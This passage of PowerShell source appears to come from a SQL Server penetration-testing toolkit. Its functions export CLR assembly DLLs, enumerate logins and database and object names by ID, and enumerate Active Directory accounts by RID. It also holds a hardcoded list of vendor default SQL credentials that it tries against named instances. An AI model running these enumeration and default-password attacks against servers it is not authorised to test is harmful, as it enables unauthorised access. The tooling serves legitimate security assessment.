        ForEach-Object -Process {
            # Set DatabaseName filter
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing assembly file information from $DbName."
            }

            # Define Query
            $Query = "USE $DbName;
                      SELECT af.assembly_id,
 					  a.name as assembly_name,
                      af.file_id,					  	
					  af.name as file_name,
                      a.clr_name,
                      af.content, 
                      a.permission_set_desc,
                      a.create_date,
                      a.modify_date,
                      a.is_user_defined
                      FROM sys.assemblies a INNER JOIN sys.assembly_files af ON a.assembly_id = af.assembly_id 
                      $AssemblyNameQuery"

            # Execute Query
            $TblAssemblyFilesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Add each result to table
            $TblAssemblyFilesTemp |
            ForEach-Object -Process {

                # Add results to table
                $null = $TblAssemblyFiles.Rows.Add(
                    [string]$ComputerName,
                    [string]$Instance,
                    [string]$DbName,
                    [string]$_.assembly_id,
                    [string]$_.assembly_name,
                    [string]$_.file_id,
                    [string]$_.file_name,
                    [string]$_.clr_name,
                    [string]$_.content,
                    [string]$_.permission_set_desc,
                    [string]$_.create_date,
                    [string]$_.modify_date,
                    [string]$_.is_user_defined)
                
                # Export dll 
                if($ExportFolder){

                    # Create export folder
                    $ExportOutputFolder = "$ExportFolder\CLRExports"
                    If ((test-path $ExportOutputFolder) -eq $False){
                        Write-Verbose "$instance : Creating export folder: $ExportOutputFolder"
                        $null = New-Item -Path "$ExportOutputFolder" -type directory
                    }  
                    
                    # Create instance subfolder if it doesnt exist
                    $InstanceClean = $Instance -replace('\\','_')
                    $ServerPath = "$ExportOutputFolder\$InstanceClean"
                    If ((test-path $Serverpath) -eq $False){
                        Write-Verbose "$instance : Creating server folder: $ServerPath"
                        $null = New-Item -Path "$ServerPath" -type directory
                    }                   

                    # Create database subfolder if it doesnt exist
                    $Databasepath = "$ServerPath\$DbName"
                    If ((test-path $Databasepath) -eq $False){
                        Write-Verbose "$instance : Creating database folder: $Databasepath"
                        $null = New-Item $Databasepath -type directory
                    } 

                    # Create dll file if it doesnt exist
                    $CLRFilename = $_.file_name
                    Write-Verbose "$instance : - Exporting $CLRFilename.dll"
                    $FullExportPath = "$Databasepath\$CLRFilename.dll"
                    $_.content | Set-Content -Encoding Byte $FullExportPath

                }                     
            }
        }
    }

    End
    {
        # Return data
        $TblAssemblyFiles
    }
}


Function  Get-SQLFuzzObjectName
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 300,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedObjects = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # All user defined objects are assigned a positive object ID plus system tables.
        # Apart from these objects, the rest of the system objects are assigned negative object IDs.
        # This object_id comes from the primary key of system table sys.sysschobjs.The column name is id, int  data type and it is not an identity column
        # If you create a new object in the database, the first ID will always be 2073058421 in SQL SERVER 2005 and 245575913 in SQL SERVER 2012.
        # The object_ID increment counter for user defined objects will add 16000057 + Last user defined object_ID and will give you a new ID.
        <# IThis object_id comes from the primary key of system table sys.sysschobjs. The new object_id will increase 16000057 (a prime number) from
                last object_id. When the last object_id +16000057 is over the int maximum ( 2147483647), it will start with a new number before the difference
                between the new bigint number and the maximum int. This cycle will generate 134 or 135 new object_id for each cycle. The system has a maximum
                number of objects,  which is 2147483647.
                The object ID is only unique within each database.
        #>

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating objects from object IDs..."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Fuzz from StartId to EndId
        $StartId..$EndId |
        ForEach-Object -Process {
            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$_' as [ObjectId],
            OBJECT_NAME($_) as [ObjectName]"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            $ObjectName = $TblResults.ObjectName
            if( -not $SuppressVerbose)
            {
                if($ObjectName.length -ge 2)
                {
                    Write-Verbose -Message "$Instance : - Object ID $_ resolved to: $ObjectName"
                }
                else
                {
                    Write-Verbose -Message "$Instance : - Object ID $_ resolved to: "
                }
            }

            # Append results
            $TblFuzzedObjects = $TblFuzzedObjects + $TblResults
        }
    }

    End
    {
        # Return data
        $TblFuzzedObjects | Where-Object -FilterScript {
            $_.ObjectName.length -ge 2
        }
    }
}


Function  Get-SQLFuzzDatabaseName
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 300,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedDbs = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating database names from database IDs..."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Fuzz from StartId to EndId
        $StartId..$EndId |
        ForEach-Object -Process {
            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$_' as [DatabaseId],
            DB_NAME($_) as [DatabaseName]"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            $DatabaseName = $TblResults.DatabaseName
            if($DatabaseName.length -ge 2)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - ID $_ - Resolved to: $DatabaseName"
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - ID $_ - Resolved to:"
                }
            }

            # Append results
            $TblFuzzedDbs = $TblFuzzedDbs + $TblResults
        }
    }

    End
    {
        # Return data
        $TblFuzzedDbs | Where-Object -FilterScript {
            $_.DatabaseName.length -ge 2
        }
    }
}


Function  Get-SQLFuzzServerLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$FuzzNum = 10000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Try to determine if the principal type is role, SQL login, or Windows account via error analysis of sp_defaultdb.')]
        [switch]$GetPrincipalType,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedLogins = New-Object -TypeName System.Data.DataTable
        $null = $TblFuzzedLogins.Columns.add('ComputerName')
        $null = $TblFuzzedLogins.Columns.add('Instance')
        $null = $TblFuzzedLogins.Columns.add('PrincipalId')
        $null = $TblFuzzedLogins.Columns.add('PrincipleName')
        if($GetPrincipalType)
        {
            $null = $TblFuzzedLogins.Columns.add('PrincipleType')
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating principal names from $FuzzNum principal IDs.."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        # Reference: https://gist.github.com/ConstantineK/c6de5d398ec43bab1a29ef07e8c21ec7
        $Query = "
                SELECT 
                '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                n [PrincipalId], SUSER_NAME(n) as [PrincipleName]
                from ( 
                select top $FuzzNum row_number() over(order by t1.number) as N
                from   master..spt_values t1 
                       cross join master..spt_values t2
                ) a
                where SUSER_NAME(n) is not null"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Process results
        $TblResults |
        ForEach-Object {

            # check if principal is role, sql login, or windows account
            $PrincipalName = $_.PrincipleName
            $PrincipalId = $_.PrincipalId

            if($GetPrincipalType)
            {
                $RoleCheckQuery = "EXEC master..sp_defaultdb '$PrincipalName', 'NOTAREALDATABASE1234ABCD'"
                $RoleCheckResults = Get-SQLQuery -Instance $Instance -Query $RoleCheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -ReturnError

                # Check the error message for a signature that means the login is real
                if (($RoleCheckResults -like '*NOTAREALDATABASE*') -or ($RoleCheckResults -like '*alter the login*'))
                {

                    if($PrincipalName -like '*\*')
                    {
                        $PrincipalType = 'Windows Account'
                    }
                    else
                    {
                        $PrincipalType = 'SQL Login'
                    }
                }
                else
                {
                    $PrincipalType = 'SQL Server Role'
                }
            }

            # Add to result set
            if($GetPrincipalType)
            {
                $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName, $PrincipalType)
            }
            else
            {
                $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName)
            }

        }
    }

    End
    {
        # Return data
        $TblFuzzedLogins | Where-Object -FilterScript {
            $_.PrincipleName.length -ge 2
        }
        
        if( -not $SuppressVerbose)
        {
            Write-Verbose -Message "$Instance : Complete."
        }
    }
}


Function  Get-SQLFuzzDomainAccount
{
   [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 500,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 1000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Set a custom domain for user enumeration. Typically used to target trusted domains.')]
        [string]$Domain,
        
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblFuzzedAccounts = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."                
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Grab server and domain information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $Instance = $ServerInfo.Instance
        if(-not $Domain){
            $Domain = $ServerInfo.DomainName
        }

        # Status the user
        Write-Verbose -Message "$Instance : Enumerating Active Directory accounts for the `"$Domain`" domain..."        

        # Grab the domain SID
        $DomainGroup = "$Domain\Domain Admins"         
        $DomainGroupSid = Get-SQLQuery -Instance $Instance -Query "select SUSER_SID('$DomainGroup') as DomainGroupSid" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose            
        $DomainGroupSidBytes = $DomainGroupSid | Select-Object -Property domaingroupsid -ExpandProperty domaingroupsid       
        try{
            $DomainGroupSidString = [System.BitConverter]::ToString($DomainGroupSidBytes).Replace('-','').Substring(0,48)
        }catch{
            Write-Warning "The provided domain did not resolve correctly."
            return
        }

        # Fuzz the domain object SIDs from StartId to EndId
        $StartId..$EndId |
        ForEach-Object -Process {
            # Convert to Principal ID to hex
            $PrincipalIDHex = '{0:x}' -f $_

            # Get number of characters
            $PrincipalIDHexPad1 = $PrincipalIDHex | Measure-Object -Character
            $PrincipalIDHexPad2 = $PrincipalIDHexPad1.Characters

            # Check if number is even and fix leading 0 if needed
            If([bool]($PrincipalIDHexPad2%2))
            {
                $PrincipalIDHexFix = "0$PrincipalIDHex"
            }

            # Reverse the order of the hex
            $GroupsOfTwo = $PrincipalIDHexFix -split '(..)' | Where-Object -FilterScript {
                $_
            }
            $GroupsOfTwoR = $GroupsOfTwo | Sort-Object -Descending
            $PrincipalIDHexFix2 = $GroupsOfTwoR -join ''

            # Pad to 8 bytes
            $PrincipalIDPad = $PrincipalIDHexFix2.PadRight(8,'0')

            # Create users rid
            $Rid = "0x$DomainGroupSidString$PrincipalIDPad"

            # Define Query
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$Rid' as [RID],
            SUSER_SNAME($Rid) as [DomainAccount]"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            $DomainAccount = $TblResults.DomainAccount
            if($DomainAccount.length -ge 2)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - RID $Rid ($_) resolved to: $DomainAccount"
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - RID $Rid ($_) resolved to: "
                }
            }

            # Append results
            $TblFuzzedAccounts = $TblFuzzedAccounts + $TblResults
        }
    }

    End
    {
        # Return data
        $TblFuzzedAccounts |
        Select-Object -Property ComputerName, Instance, DomainAccount -Unique |
        Where-Object -FilterScript {
            $_.DomainAccount -notlike ''
        }
    }
}



Function Get-ComputerNameFromInstance
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance
    )

    # Parse ComputerName from provided instance
    If ($Instance)
    {
        $ComputerName = $Instance.split('\')[0].split(',')[0]
    }
    else
    {
        $ComputerName = $env:COMPUTERNAME
    }

    Return $ComputerName
}


Function  Get-SQLServiceLocal
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance,
       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for running services.')]
        [switch]$RunOnly,
                [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        # Table for output
        $TblLocalInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblLocalInstances.Columns.Add('ComputerName')
        $null = $TblLocalInstances.Columns.Add('Instance')
        $null = $TblLocalInstances.Columns.Add('ServiceDisplayName')
        $null = $TblLocalInstances.Columns.Add('ServiceName')
        $null = $TblLocalInstances.Columns.Add('ServicePath')
        $null = $TblLocalInstances.Columns.Add('ServiceAccount')
        $null = $TblLocalInstances.Columns.Add('ServiceState')
        $null = $TblLocalInstances.Columns.Add('ServiceProcessId')
    }

    Process
    {
        # Grab SQL Server services based on file path
        $SqlServices = Get-WmiObject -Class win32_service |
        Where-Object -FilterScript {
            $_.DisplayName -like 'SQL Server *'
        } |
        Select-Object -Property DisplayName, PathName, Name, StartName, State, SystemName, ProcessId

        # Add records to SQL Server instance table
        $SqlServices |
        ForEach-Object -Process {
        
            # Parse Instance
            $ComputerName = [string]$_.SystemName
            $DisplayName = [string]$_.DisplayName
            $ServState = [string]$_.State

            # Set instance to computername by default
            $CurrentInstance = $ComputerName

            # Check for named instance
            $InstanceCheck = ($DisplayName[1..$DisplayName.Length] | Where-Object {$_ -like '('}).count
            if($InstanceCheck) {

                # Set name instance
                $CurrentInstance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0]

                # Set default instance
                if($CurrentInstance -like '*\MSSQLSERVER')
                {
                    $CurrentInstance = $ComputerName
                }
            }
          
            # If an instance is set filter out service that dont apply
            if($Instance -and $instance -notlike $CurrentInstance){
                return
            }

            # Filter out services that arent runn if needed
            if($RunOnly -and $ServState -notlike 'Running'){
                return    
                
            }
            
            # Setup process id
            if($_.ProcessId -eq 0){
                $ServiceProcessId = ""
            }else{
                $ServiceProcessId = $_.ProcessId
            }

            # Add row
            $null = $TblLocalInstances.Rows.Add(
                [string]$_.SystemName,
                [string]$CurrentInstance,
                [string]$_.DisplayName,
                [string]$_.Name,
                [string]$_.PathName,
                [string]$_.StartName,
                [string]$_.State,
                [string]$ServiceProcessId)            
        }
    }

    End
    {
        # Status User
        $LocalInstanceCount = $TblLocalInstances.rows.count

        if(-not $SuppressVerbose){
            Write-Verbose "$LocalInstanceCount local SQL Server services were found that matched the criteria."        
        }

        # Return data
        $TblLocalInstances 
    }
}

Function  Get-SQLServerLoginDefaultPw
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblResults.Columns.Add('Computer') | Out-Null
        $TblResults.Columns.Add('Instance') | Out-Null
        $TblResults.Columns.Add('Username') | Out-Null
        $TblResults.Columns.Add('Password') | Out-Null 
        $TblResults.Columns.Add('IsSysAdmin') | Out-Null

        # Create table for database of defaults
        $DefaultPasswords = New-Object System.Data.DataTable
        $DefaultPasswords.Columns.Add('Instance') | Out-Null
        $DefaultPasswords.Columns.Add('Username') | Out-Null
        $DefaultPasswords.Columns.Add('Password') | Out-Null        

        # Populate DefaultPasswords data table
        $DefaultPasswords.Rows.Add("ACS","ej","ej") | Out-Null
        $DefaultPasswords.Rows.Add("ACT7","sa","sage") | Out-Null
        $DefaultPasswords.Rows.Add("AOM2","admin","ca_admin") | out-null
        $DefaultPasswords.Rows.Add("ARIS","ARIS9","*ARIS!1dm9n#") | out-null
        $DefaultPasswords.Rows.Add("AutodeskVault","sa","AutodeskVault@26200") | Out-Null      
        $DefaultPasswords.Rows.Add("BOSCHSQL","sa","RPSsql12345") | Out-Null
        $DefaultPasswords.Rows.Add("BPASERVER9","sa","AutoMateBPA9") | Out-Null
        $DefaultPasswords.Rows.Add("CDRDICOM","sa","CDRDicom50!") | Out-Null
        $DefaultPasswords.Rows.Add("CODEPAL","sa","Cod3p@l") | Out-Null
        $DefaultPasswords.Rows.Add("CODEPAL08","sa","Cod3p@l") | Out-Null
        $DefaultPasswords.Rows.Add("CounterPoint","sa","CounterPoint8") | Out-Null
        $DefaultPasswords.Rows.Add("CSSQL05","ELNAdmin","ELNAdmin") | Out-Null
        $DefaultPasswords.Rows.Add("CSSQL05","sa","CambridgeSoft_SA") | Out-Null
        $DefaultPasswords.Rows.Add("CADSQL","CADSQLAdminUser","Cr41g1sth3M4n!") | Out-Null  #Maybe a local windows account
        $DefaultPasswords.Rows.Add("DHLEASYSHIP","sa","DHLadmin@1") | Out-Null
        $DefaultPasswords.Rows.Add("DPM","admin","ca_admin") | out-null
        $DefaultPasswords.Rows.Add("DVTEL","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("EASYSHIP","sa","DHLadmin@1") | Out-Null
        $DefaultPasswords.Rows.Add("ECC","sa","Webgility2011") | Out-Null
        $DefaultPasswords.Rows.Add("ECOPYDB","e+C0py2007_@x","e+C0py2007_@x") | Out-Null
        $DefaultPasswords.Rows.Add("ECOPYDB","sa","ecopy") | Out-Null
        $DefaultPasswords.Rows.Add("Emerson2012","sa","42Emerson42Eme") | Out-Null
        $DefaultPasswords.Rows.Add("HDPS","sa","sa") | Out-Null
        $DefaultPasswords.Rows.Add("HPDSS","sa","Hpdsdb000001") | Out-Null
        $DefaultPasswords.Rows.Add("HPDSS","sa","hpdss") | Out-Null
        $DefaultPasswords.Rows.Add("INSERTGT","msi","keyboa5") | Out-Null
        $DefaultPasswords.Rows.Add("INSERTGT","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("INTRAVET","sa","Webster#1") | Out-Null
        $DefaultPasswords.Rows.Add("MYMOVIES","sa","t9AranuHA7") | Out-Null
        $DefaultPasswords.Rows.Add("PCAMERICA","sa","pcAmer1ca") | Out-Null
        $DefaultPasswords.Rows.Add("PCAMERICA","sa","PCAmerica") | Out-Null
        $DefaultPasswords.Rows.Add("PRISM","sa","SecurityMaster08") | Out-Null
        $DefaultPasswords.Rows.Add("RMSQLDATA","Super","Orange") | out-null
        $DefaultPasswords.Rows.Add("RTCLOCAL","sa","mypassword") | Out-Null
        $DefaultPasswords.Rows.Add("RBAT","sa",'34TJ4@#$') | Out-Null
        $DefaultPasswords.Rows.Add("RIT","sa",'34TJ4@#$') | Out-Null
        $DefaultPasswords.Rows.Add("RCO","sa",'34TJ4@#$') | Out-Null
        $DefaultPasswords.Rows.Add("REDBEAM","sa",'34TJ4@#$') | Out-Null
        $DefaultPasswords.Rows.Add("SALESLOGIX","sa","SLXMaster") | Out-Null
        $DefaultPasswords.Rows.Add("SIDEXIS_SQL","sa","2BeChanged") | Out-Null
        $DefaultPasswords.Rows.Add("SQL2K5","ovsd","ovsd") | Out-Null
        $DefaultPasswords.Rows.Add("SQLEXPRESS","admin","ca_admin") | out-null
        #$DefaultPasswords.Rows.Add("SQLEXPRESS","gcs_client","SysGal.5560") | Out-Null     #SA password = GCSsa5560 
        #$DefaultPasswords.Rows.Add("SQLEXPRESS","gcs_web_client","SysGal.5560") | out-null #SA password = GCSsa5560 
        #$DefaultPasswords.Rows.Add("SQLEXPRESS","NBNUser","NBNPassword") | out-null
        $DefaultPasswords.Rows.Add("STANDARDDEV2014","test","test") | Out-Null 
        $DefaultPasswords.Rows.Add("TEW_SQLEXPRESS","tew","tew") | Out-Null
        $DefaultPasswords.Rows.Add("vocollect","vocollect","vocollect") | Out-Null
        $DefaultPasswords.Rows.Add("VSDOTNET","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("VSQL","sa","111") | Out-Null
        $DefaultPasswords.Rows.Add("CASEWISE","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("VANTAGE","sa","vantage12!") | Out-Null
        $DefaultPasswords.Rows.Add("BCM","bcmdbuser","Bcmuser@06") | Out-Null
        $DefaultPasswords.Rows.Add("BCM","bcmdbuser","Numara@06") | Out-Null
        $DefaultPasswords.Rows.Add("DEXIS_DATA","sa","dexis") | Out-Null
        $DefaultPasswords.Rows.Add("DEXIS_DATA","dexis","dexis") | Out-Null
        $DefaultPasswords.Rows.Add("SMTKINGDOM","SMTKINGDOM",'$ei$micMicro') | Out-Null
        $DefaultPasswords.Rows.Add("RE7_MS","Supervisor",'Supervisor') | Out-Null
        $DefaultPasswords.Rows.Add("RE7_MS","Admin",'Admin') | Out-Null
        $DefaultPasswords.Rows.Add("OHD","sa",'ohdusa@123') | Out-Null
        $DefaultPasswords.Rows.Add("UPC","serviceadmin",'Password.0') | Out-Null           #Maybe a local windows account
        $DefaultPasswords.Rows.Add("Hirsh","Velocity",'i5X9FG42') | Out-Null
        $DefaultPasswords.Rows.Add("Hirsh","sa",'i5X9FG42') | Out-Null
        $DefaultPasswords.Rows.Add("SPSQL","sa",'SecurityMaster08') | Out-Null
        $DefaultPasswords.Rows.Add("CAREWARE","sa",'') | Out-Null        

        $PwCount = $DefaultPasswords | measure | select count -ExpandProperty count
        # Write-Verbose "Loaded $PwCount default passwords."
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
       
        # Grab only the instance name       
        $TargetInstance = $Instance.Split("\")[1]

        # Bypass ports and default instances
        if(-not $TargetInstance){
            Write-Verbose "$Instance : No named instance found."
            return
        }
       
        # Check if instance is in list
        $TblResultsTemp = ""
        $TblResultsTemp = $DefaultPasswords | Where-Object { $_.instance -eq "$TargetInstance"}        

        if($TblResultsTemp){    
            Write-Verbose "$Instance : Confirmed instance match." 
        }else{
            Write-Verbose "$Instance : No instance match found."
            return 
        }        

        # Test login
		#Write-Verbose ($instance).ToString()
		#Write-Verbose ($CurrentUsername).ToString()
		#Write-Verbose ($CurrentPassword).ToString()
		
		# Grab and iterate username and password
		for($i=0; $i -lt $TblResultsTemp.count; $i++){
			#Write-Verbose $TblResultsTemp
			$CurrentUsername = $TblResultsTemp.username[$i]
			$CurrentPassword = $TblResultsTemp.password[$i]
			$LoginTest = Get-SQLServerInfo -Instance $instance -Username $CurrentUsername -Password $CurrentPassword -SuppressVerbose
			if($LoginTest){

				Write-Verbose "$Instance : Confirmed default credentials - $CurrentUsername/$CurrentPassword"

				$SysadminStatus = $LoginTest | select IsSysadmin -ExpandProperty IsSysadmin

				# Append if successful                      
				$TblResults.Rows.Add(
					$ComputerName,
					$Instance,
					$CurrentUsername,
					$CurrentPassword,
					$SysadminStatus
				) | Out-Null
			}else{
				Write-Verbose "$Instance : No credential matches were found."
			}
		}
    }

    End
    {
        # Return data
        $TblResults
    }
}

Function Get-SQLServerLinkCrawl{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
